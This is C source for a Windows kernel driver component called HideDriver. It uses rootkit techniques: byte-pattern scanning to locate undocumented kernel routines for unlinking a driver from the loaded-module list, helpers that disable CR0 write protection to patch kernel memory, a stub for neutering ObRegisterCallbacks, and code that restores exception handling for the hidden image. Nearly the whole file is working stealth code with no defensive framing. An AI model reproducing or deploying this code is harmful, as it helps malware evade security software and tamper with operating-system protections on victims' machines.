#include "HideDriver.h"

#pragma warning(disable: 4100)
#pragma warning(disable: 4311)
#pragma warning(disable: 4047)
#pragma warning(disable: 4055)
#pragma warning(disable: 4054)

typedef struct _KAPC_STATE {
    LIST_ENTRY ApcListHead[MaximumMode];
    struct _KPROCESS *Process;
    union {
        UCHAR InProgressFlags;
        struct {
            BOOLEAN KernelApcInProgress : 1;
            BOOLEAN SpecialApcInProgress : 1;
        };
    };

    BOOLEAN KernelApcPending;
    BOOLEAN UserApcPending;
} KAPC_STATE, *PKAPC_STATE, *PRKAPC_STATE;
NTKERNELAPI NTSTATUS PsLookupProcessByProcessId(IN HANDLE ProcessId, OUT PEPROCESS *Process);
NTKERNELAPI NTSTATUS PsLookupThreadByThreadId(IN HANDLE ThreadId, OUT PETHREAD *Thread);
NTKERNELAPI NTSTATUS MmUnmapViewOfSection(IN PEPROCESS Process, IN ULONG BaseAddress);
NTKERNELAPI UCHAR* PsGetProcessImageFileName(PEPROCESS Process);
NTKERNELAPI PEPROCESS IoThreadToProcess(IN PETHREAD Thread);
NTKERNELAPI HANDLE PsGetProcessInheritedFromUniqueProcessId(IN PEPROCESS Process);
NTKERNELAPI PPEB PsGetProcessPeb(PEPROCESS Process);
NTKERNELAPI PVOID NTAPI PsGetProcessWow64Process(PEPROCESS Process);
NTKERNELAPI VOID NTAPI KeAttachProcess(PEPROCESS Process);
NTKERNELAPI VOID NTAPI KeDetachProcess();
NTKERNELAPI
VOID
KeStackAttachProcess(
    _Inout_ PRKPROCESS PROCESS,
    _Out_ PRKAPC_STATE ApcState
);

NTKERNELAPI
VOID
KeUnstackDetachProcess(
    _In_ PRKAPC_STATE ApcState
);

NTSYSAPI
NTSTATUS
NTAPI
ZwAllocateVirtualMemory(
    _In_ HANDLE ProcessHandle,
    _Inout_ PVOID *BaseAddress,
    _In_ ULONG_PTR ZeroBits,
    _Inout_ PSIZE_T RegionSize,
    _In_ ULONG AllocationType,
    _In_ ULONG Protect
);

typedef NTSTATUS(__fastcall *MIPROCESSLIST)(PVOID pDriverSetion, int bLoad);
typedef NTSTATUS(__fastcall *RtlInsertInvertedFunctionTableWin7)(PVOID PsInvertedFunctionTable, PVOID ImageBase, SIZE_T ImageSize);
typedef NTSTATUS(__fastcall *RtlInsertInvertedFunctionTableWin10)(PVOID ImageBase, SIZE_T ImageSize);

MIPROCESSLIST g_pfnMiProcessLoaderEntry = NULL;
PVOID g_ObRegisterCallbacksChangPoint = NULL;
ULONG* g_dwPspNotifyEnableMask = NULL;

ULONG g_PspNotifyEnableMaskOld = 0;

UCHAR ObRegCode[7] =
"\xB8\x01\x00\x00\x00" //4
"\xC3";                //5

					   /*
					   .text:0000000140148178 48 89 5C 24 08                                mov     [rsp+arg_0], rbx
					   .text:000000014014817D 48 89 6C 24 10
					   */
UCHAR ObRegOldCode[7] = { 0 };

extern PSHORT NtBuildNumber;

KIRQL WPOFF()
{
	KIRQL irql = KeRaiseIrqlToDpcLevel();
	UINT64 cr0 = __readcr0();
	cr0 &= 0xfffffffffffeffff;
	__writecr0(cr0);
	_disable();
	return irql;
}

void WPON(KIRQL irql)	
{
	UINT64 cr0 = __readcr0();
	cr0 |= 0x10000;
	_enable();
	__writecr0(cr0);
	KeLowerIrql(irql);
}

PVOID GetCallAddress(PUCHAR point)
{
	PVOID pRet = NULL;
	LONG offset = 0;
	LARGE_INTEGER pAddress = { 0 };
	LARGE_INTEGER Temp = { 0 };

	if (point == NULL || !MmIsAddressValid(point))
		return NULL;

	RtlCopyMemory(&offset, point + 1, 4);

	if ((offset & 0x10000000) == 0x10000000)
	{
		Temp.QuadPart = offset + 5 + point;
		pAddress.QuadPart = (ULONG_PTR)point & 0xFFFFFFFF00000000;
		pAddress.LowPart = Temp.LowPart;
		pRet = pAddress.QuadPart;
		if (MmIsAddressValid(pRet))
			return pRet;
		else
			return NULL;
	}

	pRet = offset + 5 + point;
	if (MmIsAddressValid(pRet))
		return pRet;
	else
		return NULL;
}

PVOID GetLeaPoint(PUCHAR point)
{
	PVOID pRet = NULL;
	LONG offset = 0;
	LARGE_INTEGER pAddress = { 0 };
	LARGE_INTEGER Temp = { 0 };

	if (point == NULL || !MmIsAddressValid(point))
		return NULL;

	RtlCopyMemory(&offset, point + 3, 4);

	if ((offset & 0x10000000) == 0x10000000)
	{
		Temp.QuadPart = offset + 7 + point;
		pAddress.QuadPart = (ULONG_PTR)point & 0xFFFFFFFF00000000;
		pAddress.LowPart = Temp.LowPart;
		pRet = pAddress.QuadPart;
		if (MmIsAddressValid(pRet))
			return pRet;
		else
			return NULL;
	}

	pRet = offset + 7 + point;
	if (MmIsAddressValid(pRet))
		return pRet;
	else
		return NULL;
}

PVOID GetUndocumentFunctionAdress(IN PUNICODE_STRING pFunName, IN UCHAR* pFeatureCode)
{
	ULONG dwIndex = 0;

	ULONG dwOffset = 0;
	ULONG_PTR returnAddress = 0;
	PUCHAR pFunAddress = NULL;

	if ((pFunName == NULL) && (pFeatureCode == NULL) && (pFunName->Buffer == NULL))
	{
		return NULL;
	}

	pFunAddress = (PUCHAR)MmGetSystemRoutineAddress(pFunName);

	do
	{
		if (pFunAddress == NULL)
		{
			break;
		}

		for (dwIndex = 0; dwIndex < 0x300; dwIndex++)
		{

			__try
			{
				if ((pFunAddress[dwIndex] == pFeatureCode[0]) && (pFunAddress[dwIndex + 1] == pFeatureCode[1]))
				{

					RtlCopyMemory(&dwOffset, (PVOID)(pFunAddress + dwIndex + 2), sizeof(ULONG));


					if ((dwOffset & 0x10000000) == 0x10000000)
					{
						dwOffset = dwOffset + 5 + ((ULONG)(pFunAddress + dwIndex + 1));
						returnAddress = (ULONG_PTR)pFunAddress & 0xFFFFFFFF00000000;
						returnAddress = returnAddress + (ULONG_PTR)dwOffset;
						return (PVOID)returnAddress;
					}

					returnAddress = (ULONG_PTR)dwOffset + 5 + (ULONG_PTR)(pFunAddress + dwIndex + 1);
					return (PVOID)returnAddress;
				}
			}
			__except (EXCEPTION_EXECUTE_HANDLER)
			{

			}
		}
	} while (0);

	return 0;
}

PVOID GetUndocumentFunctionAdressByAddress(PUCHAR pAddress, IN UCHAR* pFeatureCode)
{
	ULONG dwIndex = 0;

	ULONG dwOffset = 0;
	ULONG_PTR returnAddress = 0;
	PUCHAR pFunAddress = NULL;

	if ((pAddress == NULL) || pFeatureCode == NULL || !MmIsAddressValid(pAddress))
	{
		return NULL;
	}

	pFunAddress = pAddress;

	do
	{
		for (dwIndex = 0; dwIndex < 0x300; dwIndex++)
		{

			__try
			{
				if ((pFunAddress[dwIndex] == pFeatureCode[0]) && (pFunAddress[dwIndex + 1] == pFeatureCode[1]))
				{

					RtlCopyMemory(&dwOffset, (PVOID)(pFunAddress + dwIndex + 2), sizeof(ULONG));


					if ((dwOffset & 0x10000000) == 0x10000000)
					{
						dwOffset = dwOffset + 5 + ((ULONG)(pFunAddress + dwIndex + 1));
						returnAddress = (ULONG_PTR)pFunAddress & 0xFFFFFFFF00000000;
						returnAddress = returnAddress + (ULONG_PTR)dwOffset;
						return (PVOID)returnAddress;
					}

					returnAddress = (ULONG_PTR)dwOffset + 5 + (ULONG_PTR)(pFunAddress + dwIndex + 1);
					return (PVOID)returnAddress;
				}
			}
			__except (EXCEPTION_EXECUTE_HANDLER)
			{

			}

		}
	} while (0);

	return 0;
}

PVOID GetUndocumentFunctionAddressEx(IN PUNICODE_STRING pFunName, IN PUCHAR pStartAddress, IN UCHAR* pFeatureCode, IN ULONG FeatureCodeNum, ULONG SerSize, UCHAR SegCode, ULONG AddNum, BOOLEAN ByName)
{
	ULONG dwIndex = 0;
	PUCHAR pFunAddress = NULL;
	ULONG dwCodeNum = 0;

	if (pFeatureCode == NULL)
		return NULL;

	if (FeatureCodeNum >= 15)
		return NULL;

	if (SerSize > 0x1024)
		return NULL;

	if (ByName)
	{
		if (pFunName == NULL || !MmIsAddressValid(pFunName->Buffer))
			return NULL;

		pFunAddress = (PUCHAR)MmGetSystemRoutineAddress(pFunName);
		if (pFunAddress == NULL)
			return NULL;
	}
	else
	{
		if (pStartAddress == NULL || !MmIsAddressValid(pStartAddress))
			return NULL;

		pFunAddress = pStartAddress;
	}

	for (dwIndex = 0; dwIndex < SerSize; dwIndex++)
	{
		__try
		{
			if (pFunAddress[dwIndex] == pFeatureCode[dwCodeNum] || pFeatureCode[dwCodeNum] == SegCode)
			{
				dwCodeNum++;

				if (dwCodeNum == FeatureCodeNum)
					return pFunAddress + dwIndex - dwCodeNum + 1 + AddNum;

				continue;
			}

			dwCodeNum = 0;
		}
		__except (EXCEPTION_EXECUTE_HANDLER)
		{
			return 0;
		}
	}

	return 0;
}

BOOLEAN FuckAllSystemWin10(PVOID pDriverSection)
{

	UNICODE_STRING usFuncName = { 0 };
	UCHAR Code[3] = { 0xd8, 0xe8,0x0 };
	PUCHAR pMiUnloadSystemImage = NULL;
	PUCHAR pMiProcessLoaderEntry = NULL;
	size_t i = 0;

	RtlInitUnicodeString(&usFuncName, L"MmUnloadSystemImage");

	pMiUnloadSystemImage = GetUndocumentFunctionAdress(&usFuncName, Code);

	if (pMiUnloadSystemImage == NULL)
		return FALSE;


	pMiUnloadSystemImage = pMiUnloadSystemImage + 0x280;
	for (i = 0; i < 0xff; i++)
	{

		__try {
			if (*pMiUnloadSystemImage == 0xe8 && *(pMiUnloadSystemImage - 1) == 0xcb && *(pMiUnloadSystemImage - 4) == 0xd2 && *(pMiUnloadSystemImage - 5) == 0x33)
			{
				pMiProcessLoaderEntry = GetCallAddress(pMiUnloadSystemImage);
				if (pMiProcessLoaderEntry == NULL)
					return FALSE;

				break;
			}
		}
		__except (1)
		{
			return FALSE;
		}
		pMiUnloadSystemImage++;
	}

	g_pfnMiProcessLoaderEntry = pMiProcessLoaderEntry;
	
	//g_pfnMiProcessLoaderEntry(pDriverSection, 0);

	return TRUE;
}

BOOLEAN FuckSystemWin7(PVOID pDriverSection)
{
	UNICODE_STRING usFuncName = { 0 };
	PUCHAR pMiProcessLoaderEntry = NULL;
	size_t i = 0;

	RtlInitUnicodeString(&usFuncName, L"EtwWriteString");

	pMiProcessLoaderEntry = (PUCHAR)MmGetSystemRoutineAddress(&usFuncName);

	pMiProcessLoaderEntry = pMiProcessLoaderEntry - 0x600;

	__try {
		for (i = 0; i < 0x600; i++)
		{

			if (*pMiProcessLoaderEntry == 0xbb && *(pMiProcessLoaderEntry + 1) == 0x01 && *(pMiProcessLoaderEntry + 2) == 0x0 &&
				*(pMiProcessLoaderEntry + 5) == 0x48 && *(pMiProcessLoaderEntry + 0xc) == 0x8a && *(pMiProcessLoaderEntry + 0xd) == 0xd3
				&& *(pMiProcessLoaderEntry + 0xe) == 0xe8)
			{
				pMiProcessLoaderEntry = pMiProcessLoaderEntry - 0x40;
				for (i = 0; i < 0x30; i++)
				{
					if (*pMiProcessLoaderEntry == 0x90 && *(pMiProcessLoaderEntry + 1) == 0x48)
					{
						pMiProcessLoaderEntry++;
						goto MiProcessSuccess;
					}
					pMiProcessLoaderEntry++;
				}
				return FALSE;
			}
			pMiProcessLoaderEntry++;
		}
	}
	__except (1)
	{
		return FALSE;
	}

	return FALSE;
MiProcessSuccess:

	g_pfnMiProcessLoaderEntry = pMiProcessLoaderEntry;

	//g_pfnMiProcessLoaderEntry(pDriverSection, 0);

	return TRUE;
}

VOID HideDriver(PVOID pDriverSection)
{
    //ULONG_PTR test = 0;
    BOOLEAN bRet = FALSE;
    PDRIVER_CONTEXT_INFO pDriverInfo = (PDRIVER_CONTEXT_INFO)pDriverSection;
    if (pDriverSection == NULL)
        return;

    if (*NtBuildNumber < 9600)
        bRet = FuckSystemWin7(pDriverInfo->SectionPoint);
    else
        bRet = FuckAllSystemWin10(pDriverInfo->SectionPoint);

    if (bRet)
    {
        EnableSEH(pDriverSection);
    }
}

NTSTATUS EnableSehSafeWin7(PDRIVER_CONTEXT_INFO pDriverInfo)
{
	/*
	.text:0000000140163A82 44 8B 47 40                                   mov     r8d, [rdi+40h]
	.text:0000000140163A86 48 8B 57 30                                   mov     rdx, [rdi+30h]
	.text:0000000140163A8A 48 8D 0D 2F 7A 08 00                          lea     rcx, PsInvertedFunctionTable
	.text:0000000140163A91 E8 EA 84 FB FF                                call    RtlInsertInvertedFunctionTable
	*/
	PUCHAR pAddress = g_pfnMiProcessLoaderEntry;
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	UCHAR code[6] = "\x48\x8b\x57\x30\x48";
	PVOID PsTable = NULL;
	RtlInsertInvertedFunctionTableWin7 pfnRtlInsertInvertedFunctionTable = NULL;

	do
	{
		if (!MmIsAddressValid((PVOID)pAddress))
			break;
		
		pAddress = GetUndocumentFunctionAddressEx(NULL, pAddress, code, 5, 0x200, 0x90, 4, FALSE);

		if (!MmIsAddressValid(pAddress))
			break;

		PsTable = GetLeaPoint(pAddress);

		if (!MmIsAddressValid(PsTable))
			break;

		pfnRtlInsertInvertedFunctionTable = (RtlInsertInvertedFunctionTableWin7)GetCallAddress(pAddress + 7);

		if (!MmIsAddressValid((PVOID)pfnRtlInsertInvertedFunctionTable))
			break;

		status = pfnRtlInsertInvertedFunctionTable(PsTable, pDriverInfo->ImageBase, pDriverInfo->ImageSize);
	} while (FALSE);

	return status;
}

NTSTATUS EnableSehSafeWin10(PDRIVER_CONTEXT_INFO pDriverInfo)
{
	/*
	.text:0000000140013E41 8B 57 40                                      mov     edx, [rdi+40h]
	.text:0000000140013E44 48 8B 4F 30                                   mov     rcx, [rdi+30h]
	.text:0000000140013E48 E8 5F FE FF FF                                call    RtlInsertInvertedFunctionTable
	*/
	PUCHAR pAddress = g_pfnMiProcessLoaderEntry;
	UCHAR code[6] = "\x48\x8b\x4f\x30\xe8";
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	RtlInsertInvertedFunctionTableWin10 pfnRtlInsertInvertedFunctionTable = NULL;

	do
	{
		if (!MmIsAddressValid(pAddress))
			break;

		pAddress = GetUndocumentFunctionAddressEx(NULL, pAddress, code, 5, 0x200, 0x90, 4, FALSE);

		if (!MmIsAddressValid(pAddress))
			break;

		pfnRtlInsertInvertedFunctionTable = (RtlInsertInvertedFunctionTableWin10)GetCallAddress(pAddress);

		if (!MmIsAddressValid((PVOID)pfnRtlInsertInvertedFunctionTable))
			break;

		status = pfnRtlInsertInvertedFunctionTable(pDriverInfo->ImageBase, pDriverInfo->ImageSize);

	} while (FALSE);

	return status;
}

NTSTATUS EnableSEH(PVOID pDriverInfo)
{
	PDRIVER_CONTEXT_INFO pInfo = pDriverInfo;

	if (pDriverInfo == NULL || !MmIsAddressValid(pDriverInfo))
		return STATUS_INVALID_ADDRESS;

	if (*NtBuildNumber < 9600)
		return EnableSehSafeWin7(pInfo);
	else
		return EnableSehSafeWin10(pInfo);
}

PVOID GetMovDwordPoint(PUCHAR point)
{
    PVOID pRet = NULL;
    LONG offset = 0;
    LARGE_INTEGER pAddress = { 0 };
    LARGE_INTEGER Temp = { 0 };

    if (point == NULL || !MmIsAddressValid(point))
        return NULL;

    RtlCopyMemory(&offset, point + 2, 4);

    if ((offset & 0x10000000) == 0x10000000)
    {
        Temp.QuadPart = offset + 6 + point;
        pAddress.QuadPart = (ULONG_PTR)point & 0xFFFFFFFF00000000;
        pAddress.LowPart = Temp.LowPart;
        pRet = pAddress.QuadPart;
        if (MmIsAddressValid(pRet))
            return pRet;
        else
            return NULL;
    }

    pRet = offset + 6 + point;
    if (MmIsAddressValid(pRet))
        return pRet;
    else
        return NULL;
}
